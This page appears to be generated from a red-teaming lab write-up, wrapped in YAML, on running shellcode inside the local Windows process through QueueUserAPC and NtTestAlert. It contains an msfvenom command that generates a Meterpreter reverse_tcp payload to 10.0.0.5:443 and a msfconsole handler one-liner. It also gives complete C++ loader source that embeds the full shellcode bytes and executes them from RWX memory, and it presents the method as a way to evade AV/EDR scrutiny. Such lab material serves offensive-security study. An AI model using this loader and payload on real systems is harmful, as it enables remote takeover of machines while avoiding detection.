---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Shellcode Execution in a Local Process with QueueUserAPC and NtTestAlert

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-code-injection-process-injection-shellcode-execution-in-a-local-process-with-queueuserapc-and-nttestalert` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-injection-process-injection/shellcode-execution-in-a-local-process-with-queueuserapc-and-nttestalert.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Shellcode Execution in a Local Process with QueueUserAPC and NtTestAlert](../../topics/offensive-security/shellcode-execution-in-a-local-process-with-queueuserapc-and-nttestalert.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-code-injection-process-injection-shellcode-execution-in-a-local-process-with-queueuserapc-and-nttestalert |
| name | Shellcode Execution in a Local Process with QueueUserAPC and NtTestAlert |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/code-injection-process-injection/shellcode-execution-in-a-local-process-with-queueuserapc-and-nttestalert.md |

## Preserved Source Material

````yaml
_asset_filenames:
- Annotation 2019-05-27 191650.png
- Annotation 2019-05-27 192952.png
- apc-local.gif
_body: "# Shellcode Execution in a Local Process with QueueUserAPC and NtTestAlert\n\nThis is a quick lab that shows how to\
  \ execute shellcode within a local process by leveraging a Win32 API `QueueUserAPC` and an officially undocumented Native\
  \ API `NtTestAlert`, which lands in kernel that calls `KiUserApcDispatcher` if the APC queue is not empty.\n\nThe advantage\
  \ of this technique is that it does not rely on `CreateThread` or `CreateRemoteThread` API calls which are more popular\
  \ and hence usually more scrutinized by SOCs and AV/EDR vendors.\n\nThanks to [Mumbai](https://twitter.com/win64\\_) for\
  \ pointing me to `NtTestAlert`.\n\n## Execution\n\nThe flow of the technique is simple:\n\n1. Allocate memory in the local\
  \ process for the shellcode\n2. Write shellcode to the newly allocated memory location\n3. Queue an APC to the current thread\n\
  4. Issue `NtTestAlert`\n5. Receive meterpreter session\n\nLets's generate the meterpreter shellcode first:\n\n{% code title=\"\
  attacker@kali\" %}\n```csharp\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f c\n```\n{% endcode\
  \ %}\n\n![](<../../.gitbook/assets/Annotation 2019-05-27 191650.png>)\n\nShort code that performs `NtTestAlert` function\
  \ address resolution, memory allocation, shellcode writing to memory, APC queuing and `NtTestAlert` call:\n\n![](<../../.gitbook/assets/Annotation\
  \ 2019-05-27 192952.png>)\n\nNow, set up a multi handler for catching the incoming meterpreter connection:\n\n{% code title=\"\
  attacker@kali\" %}\n```csharp\nmsfconsole -x \"use exploits/multi/handler; set lhost 10.0.0.5; set lport 443; set payload\
  \ windows/x64/meterpreter/reverse_tcp; exploit\"\n```\n{% endcode %}\n\nBelow shows the technique in action, resulting in\
  \ a meterpreter shell:\n\n![](../../.gitbook/assets/apc-local.gif)\n\n## Code\n\n{% code title=\"local-apc.cpp\" %}\n```cpp\n\
  #include \"pch.h\"\n#include <Windows.h>\n\n#pragma comment(lib, \"ntdll\")\nusing myNtTestAlert = NTSTATUS(NTAPI*)();\n\
  \nint main()\n{\n\tunsigned char buf[] = \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xcc\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\\
  x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\\
  xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\\
  xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x66\\x81\\x78\\x18\\x0b\\x02\\x0f\\x85\\x72\\x00\\\
  x00\\x00\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\\
  x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\\
  xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\\
  x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\\
  x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\\
  x8b\\x12\\xe9\\x4b\\xff\\xff\\xff\\x5d\\x49\\xbe\\x77\\x73\\x32\\x5f\\x33\\x32\\x00\\x00\\x41\\x56\\x49\\x89\\xe6\\x48\\\
  x81\\xec\\xa0\\x01\\x00\\x00\\x49\\x89\\xe5\\x49\\xbc\\x02\\x00\\x01\\xbb\\x0a\\x00\\x00\\x05\\x41\\x54\\x49\\x89\\xe4\\\
  x4c\\x89\\xf1\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\\x4c\\x89\\xea\\x68\\x01\\x01\\x00\\x00\\x59\\x41\\xba\\x29\\x80\\\
  x6b\\x00\\xff\\xd5\\x6a\\x0a\\x41\\x5e\\x50\\x50\\x4d\\x31\\xc9\\x4d\\x31\\xc0\\x48\\xff\\xc0\\x48\\x89\\xc2\\x48\\xff\\\
  xc0\\x48\\x89\\xc1\\x41\\xba\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x48\\x89\\xc7\\x6a\\x10\\x41\\x58\\x4c\\x89\\xe2\\x48\\x89\\\
  xf9\\x41\\xba\\x99\\xa5\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0a\\x49\\xff\\xce\\x75\\xe5\\xe8\\x93\\x00\\x00\\x00\\x48\\\
  x83\\xec\\x10\\x48\\x89\\xe2\\x4d\\x31\\xc9\\x6a\\x04\\x41\\x58\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\\
  x83\\xf8\\x00\\x7e\\x55\\x48\\x83\\xc4\\x20\\x5e\\x89\\xf6\\x6a\\x40\\x41\\x59\\x68\\x00\\x10\\x00\\x00\\x41\\x58\\x48\\\
  x89\\xf2\\x48\\x31\\xc9\\x41\\xba\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x48\\x89\\xc3\\x49\\x89\\xc7\\x4d\\x31\\xc9\\x49\\x89\\\
  xf0\\x48\\x89\\xda\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7d\\x28\\x58\\x41\\x57\\x59\\\
  x68\\x00\\x40\\x00\\x00\\x41\\x58\\x6a\\x00\\x5a\\x41\\xba\\x0b\\x2f\\x0f\\x30\\xff\\xd5\\x57\\x59\\x41\\xba\\x75\\x6e\\\
  x4d\\x61\\xff\\xd5\\x49\\xff\\xce\\xe9\\x3c\\xff\\xff\\xff\\x48\\x01\\xc3\\x48\\x29\\xc6\\x48\\x85\\xf6\\x75\\xb4\\x41\\\
  xff\\xe7\\x58\\x6a\\x00\\x59\\x49\\xc7\\xc2\\xf0\\xb5\\xa2\\x56\\xff\\xd5\";\n\tmyNtTestAlert testAlert = (myNtTestAlert)(GetProcAddress(GetModuleHandleA(\"\
  ntdll\"), \"NtTestAlert\"));\n\tSIZE_T shellSize = sizeof(buf);\n\tLPVOID shellAddress = VirtualAlloc(NULL, shellSize, MEM_COMMIT,\
  \ PAGE_EXECUTE_READWRITE);\n\n\tWriteProcessMemory(GetCurrentProcess(), shellAddress, buf, shellSize, NULL);\n\t\n\tPTHREAD_START_ROUTINE\
  \ apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;\n\tQueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), NULL);\n\t\
  testAlert();\n\n\treturn 0;\n}\n```\n{% endcode %}\n\n## Reference\n\n{% embed url=\"https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FAPC%2FNtTestAlert.html\"\
  \ %}\n\n{% embed url=\"https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-queueuserapc\"\
  \ %}"
_relative_path: offensive-security/code-injection-process-injection/shellcode-execution-in-a-local-process-with-queueuserapc-and-nttestalert.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-injection-process-injection/shellcode-execution-in-a-local-process-with-queueuserapc-and-nttestalert.md
````
